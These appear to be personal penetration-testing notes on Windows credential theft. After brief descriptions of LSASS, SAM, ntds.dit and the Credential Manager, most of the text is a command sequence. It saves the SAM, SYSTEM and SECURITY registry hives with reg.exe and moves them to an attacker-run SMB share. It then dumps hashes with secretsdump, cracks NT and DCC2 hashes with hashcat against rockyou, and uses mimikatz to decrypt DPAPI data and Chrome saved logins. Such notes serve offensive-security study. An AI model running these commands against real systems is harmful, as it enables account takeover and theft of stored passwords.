LSASS is the windowws Local Security Authority Subsystem Service,
which has multiple modules that governs all authentication processes

SAM is the windows Security Account Manager

Active Directory database is found in ntds.dit (database file that stores AD data, including user accs, group accs, computer accs, group policy objects)

Windows NT4.0 now uses syskey.exe to partially encrypt the SAM file on disk.

Credentials manager is found in the credential locker for each user, found:
C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\



HIVES
Registry hives can be copied from here:
HKLM\SAM
HKLM\SYSTEM
HKLM\SECURITY

in system32 (where reg.exe is), use: 
reg.exe save hklm\sam C:\sam.save
or
reg.exe save hklm\system C:\system.save
or
reg.exe save hklm\security C:\security.save



MOVING FILES VIA SMB SHARE:
locate smbserver.py
onhost:
sudo python3 smbserver.py -smb2support ShareName /home/ltnbob/Documents/
ontarget:
move sam.save \\<host-ip>\ShareName


DUMPING WINDOWS HASHES w/ SECRETSDUMP
locate secretsdump
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL


^CRACKINNG THE RESULTS (NT Hashes, DCC2 Hashes, DPAPI)
NT hashes:
sudo hashcat -m 1000 hashes.txt rockyou.txt

DCC2 hashes:
sudo hashcat -m 2100 hashes.txt rockyou.txt

DPAPI:
mimikatz.exe 
dpapi::unprotect /in:encrypted_data.bin /masterkey:machine_key,user_key

or for chrome files:
dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
